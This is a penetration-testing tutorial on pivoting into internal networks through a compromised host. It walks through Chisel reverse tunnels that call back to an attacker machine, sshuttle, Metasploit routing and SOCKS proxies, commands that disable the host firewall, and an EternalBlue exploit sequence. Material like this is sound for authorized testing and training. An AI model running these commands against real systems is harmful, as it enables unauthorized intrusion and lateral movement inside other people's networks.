# Pivoting

> Arav Budhiraja | 13th August 2021

Pivoting is the process of being able to gain access to a network, to which an attacker is not connected, through a compromised machine which is connected to this network and the network to whicht the attacker is connected

# Network Diagram

![Network Diagram](pivoting-network.png)

<div style="page-break-after: always"></div>

# Using Chisel

Chisel can be used on windows/linux to establish a connection between our kali machine and the machine on the internal network.

The best part is that it does not require SSH access.

Chisel can be used to gain access to an internal network via a proxy and forward a local port on our machine to a machine on an internal network.

Note: Running the chisel server requires root privileges. 

Chisel has 2 modes: client and server. Client is used to connect to a server and the server will run chisel on a port and accept connections.

## Download Chisel

* <a href="https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz">Windows 64 Bit</a>

* <a href="https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_386.gz">Windows 32 Bit</a>

* <a href="https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz">Linux 64 Bit</a>

* <a href="https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_386.gz">Linux 32 Bit</a>

To unzip the .gz file/files, we can run the following command.

```bash
gunzip *
```
<div style="page-break-after: always"></div>

## Reverse SOCKS Proxy

In this case, our kali machine will run a chisel server and the comprimised machine will connect back. Once it does, a proxy server will start listening and the traffic sent to that proxy will be used to forward packets to the internal network via the compromised machine

On the kali machine, you would run a server using this command.

```bash
sudo ./chisel server -p 9000 --reverse &
```

Here, `9000` is the port which the chisel server will listen on and `&` is used to background all processes. `--reverse` specifies that clients which connect can open portts on our machine

Upon running the server, we can connect to it from the windows machine using the chisel client.

```md
.\chisel.exe client 192.168.1.13:9000 R:socks
```

Here, `192.168.1.13` is the IP of the kali machine, `9000` is the port the chisel server 

Now the proxy server should be listening on port `1080` 

We have to add an entry to the proxychains configuration file to interact with the internal network.

```bash
sudo echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

We can use proxychains to scan and hack the internal network by prepending `proxychains` to the beginning of the command.

If we want to run an Nmap scan, we can run the following command.

```md
proxychains nmap -sT 10.10.10.0/24
```
Note: We cannot run SYN/UDP Scans when using proxychains.

<div style="page-break-after: always"></div>

## Port Forwarding

There are 2 types of port forwarding: remote and local

Remote Port Forwarding -> A client requests a server to open one of its port and let all the traffic it receives on that port be forwarded to a port on the client side

Local Port Forwarding -> A client opens one of its ports and requests the server to let it forward the traffic it receives on that port to a port on the server side

## Remote Port Forwarding 

Our kali machine will run the server and the compromised machine acts as a client

It will request the kali machine to open a port and forward the traffic it receives on the port to a port of a machine on the internal network which is on the clients side

First we'll have to setup a chisel server on the kali machine which can be done by running this command.

```bash
./chisel server -p 9000 --reverse &
```

Here, `9000` is the port we are gonna listen on and `&` is used to background the processes.

Let's say that the machine in the internal network with the IP `10.10.10.5` is running an FTP server on port `21` 

The chisel client can request the server to open one of its port and forward the traffic it receives on that port to the FTP server and the traffic would flow through the client machine

```bash
./chisel.exe client 192.168.1.13:9000 R:2021:10.10.10.5:21
```

Here, `192.168.1.13` is the kali machine's IP, `9000` is the port chisel is running on

`2021` is the local port from which traffic will be sent to the FTP server, `10.10.10.5` is the machine on the internal network and `21` is the port on which FTP is running on `10.10.10.5`.

Now if we wish to enumerate the FTP service, we would enumerate local port `2021`. All traffic received on `127.0.0.1` would be sent through the compromised machine and to the windows machine in the internal network.  

We can enumerate the FTP server using Nmap by running the following command.

```md
nmap -sV -p 2021 127.0.0.1
```

<div style="page-break-after: always"></div>

## Local Port Forwarding 

In this case, the compromised machine will run a server and the client will connect to that server

The client will open one of its port and request the server to let the traffic, the client receives on that port, to be forwarded to a port on the servers side through the server

The client can send packets to a local port which would be forwarded to a port of a machine on the internal network via the chisel server

First we'll have to setup a chisel server on the compromised machine which can be done by running this command.

```md
./chisel.exe server -p 9000 
```

Here, `9000` is the port the compromised machine will listen on.

Let's say that the machine in the internal network with the IP `10.10.10.5` is running an FTP server on port `21`

The client can open port `2021` on their computer and request the server to let the traffic received on the client's port of `2021` to be forward to port `21` on `10.10.10.5` through the chisel server

```md
./chisel client 192.168.1.9:9000 R:2021:10.10.10.5:21
```

Here, `192.168.1.9` is the compromised machine's IP, `9000` is the port chisel is running on, `2021` is the port from which traffic from the compromised machine will be sent to the FTP server, `10.10.10.5` is the machine on the internal network and `21` is the port on which the FTP server is running

Note: When running a chisel server on a compromised machine, we may need to disable the firewall. This can be done by running the following command on windows.

```powershell
netsh advfirewall set allprofiles state off
```

To disable the firewall on linux, we can use any one of the following commands

```bash
sudo ufw disable
-----------------
sudo systemctl stop firewalld
-----------------
sudo systemctl disable firewalld.service
```

Now if we wish to enumerate the FTP server, we would enumerate local port `2021`. All traffic received on `127.0.0.1:2021` would be sent to the windows machine in the internal network, via the server on the compromised machine. Thus we can use the following command.

```md
nmap -sV -p 2021 127.0.0.1
```

<div style="page-break-after: always"></div>

# Using SShuttle

SShuttle can be used on ONLY LINUX hosts with SSH ENABLED to pivot to an internal network. If SSH is not enabled, we can enable it once we have root access to the system.

## Downloading SShuttle

SShuttle can be downloaded using apt or pip.

```bash
sudo apt install sshuttle
```
OR
```bash
sudo pip3 install sshuttle
```

<div style="page-break-after: always"></div>

## Pivoting with SShuttle 

SShuttle is extremely easy to use and we only have to run 1 command.

```md
sshuttle -r root@192.168.1.7 10.10.10.0/24
```

Here, `192.168.1.7` is the IP of the compromised Linux machine running SSH and `10.10.10.0/24` is the network we wish to gain access to. We would then be prompted to enter the password for root.

If the server only accepts private keys, then we can use the following command.

```md
sshuttle -r root@192.168.1.7 --ssh-cmd "ssh -i id_rsa" 10.10.10.0/24
```

Here, `192.168.1.7` is the IP of the compromised Linux machine running SSH, `id_rsa` is the private key and `10.10.10.0/24` is the network we wish to gain access to. You may be prompted to enter the password for the private key. 

<div style="page-break-after: always"></div>

We may get the following error when using SShuttle.

```md
client: Connected.  
client_loop: send disconnect: Broken pipe  
client: fatal: server died with error code 255
```

This can be caused due to the compromised machine being connected to the network we are attempting to gain access to. If we want to prevent this error, we can exclude the IP of the compromised machine on the compromised network.

```md
sshuttle -r root@192.168.1.7 10.10.10.0/24 -x 10.10.10.16
```

Here, `192.168.1.7` is the IP of the compromised Linux machine running SSH, `10.10.10.16` is the IP of the compromised linux machine on the internal network and `10.10.10.0/24` is the network we wish to gain access to. 

If SShuttle works perfectly, it'll add a route to the internal network and we can enumerate this network. 

We can run a Nmap scan using the following command where 10.10.10.0/24 is the internal network. 

```md
nmap -sV 10.10.10.0/24
```

<div style="page-break-after: always"></div>

# Using Metasploit and Proxychains

To gain access to an internal network from Metasploit, we would add a route to that network and start a socks4a proxy to access the network from outside metasploit. 

Before running this module we have to ensure that we have a meterpreter session. To upgrade a session to a meterpreter one we can run the following command in metasploit.

```md
msf6 > sessions -u 1
```

Here, `1` is the session number.

Once we have a meterpreter session, we can add a route to the network. First we'll have to get the subnet and netmask. This can be done by hopping into the meterpreter session and running the following command.

```md
meterpreter > ipconfig
```

Once we have the required information, we can add a route to the network from metasploit by running the following command.

```md
msf6 > route add 10.10.10.0/24 255.255.255.0 1
```

Here, `10.10.10.0/24` is the internal network, `255.255.255.0` is the netmask and `1` is the meterpreter session number.

<div style="page-break-after: always"></div>

Now we have access to the internal network but only within metasploit. To use it in a normal terminal, we will use a socks4a proxy.

```md
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 9999
msf6 auxiliary(socks_proxy) > set VERSION 4a
msf6 auxiliary(socks_proxy) > run
```

We can use proxychains to scan and hack the internal network by prepending `proxychains` to the beginning of the command. First we have to add the entry for the socks4a proxy in the config file which can be done by running this command.

```bash
sudo echo "socks4 127.0.0.1 9999" >> /etc/proxychains.conf
```

If we want to run an Nmap scan, we can run the following command.

```md
proxychains nmap -sT 10.10.10.0/24
```
Note: We cannot run SYN/UDP Scans when using proxychains.

<div style="page-break-after: always"></div>

## Gaining a shell on the machine

Let's assume that the windows machine in the internal network is running SMB v1.0 on port `445`. Since v1.0 is vulnerable to MS07-010(EternalBlue), we can get an RCE on it. 

```md
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue)> set payload windows/meterpreter/bind_tcp
msf6 exploit(ms17_010_eternalblue)> set LHOST 10.10.10.5
msf6 exploit(ms17_010_eternalblue)> set RHOST 10.10.10.5
msf6 exploit(ms17_010_eternalblue)> set LPORT 9001
msf6 exploit(ms17_010_eternalblue)> exploit
```

Note: We have to use a bind shell since the machine in the internal network cannot connect back to us, but we can connect to it via the proxy. 

If we dont have access to the machine via metasploit, we can upload a static binary of netcat to the already compromised host and catch a reverse shell

## Double pivoting

Double pivoting is when we access another network via a compromised machine on an internal network, which we got access to via the compromised machine on our network

The first pivot is pivoting to the 1st internal network via a machine on our network

The second pivot is pivoting to the 2nd internal network via a compromised machine on the 1st internal network

To get access to the 2nd internal network, we would first add a route to the new network and then start a socks4a proxy on a different port such as 7001
Note: Do not remove the 1st entry for the 1st internal network in the proxychains config file as we are using a machine on the 1st internal network to access the second one

## Useful Metasploit Modules

If we are pivoting with metasploit then some useful enumeration modules would be:

1. auxiliary/scanner/portscan/tcp - Scans a set of ports on a machine in an internal network.

```md
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp)> set RHOSTS 10.10.10.0/24
msf6 auxiliary(tcp)> set PORTS 21,22,80,443,445
msf6 auxiliary(tcp)> set THREADS 40
msf6 auxiliary(tcp)> run
```

2. arp_scanner - Detects live hosts on the network. A meterpreter session is required to run this. This probably only works on windows

```md
meterpreter > run arp_scanner -r 10.10.10.0/24
```

<div style="page-break-after: always"></div>

# Cheatsheets

<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md">PayloadAllTheThings Network Pivoting Techniques </a>

<a href="https://www.giac.org/paper/gpen/3579/post-exploitation-metasploit-pivot-port/121704">GIAC Post Exploitation Pivoting</a>

***
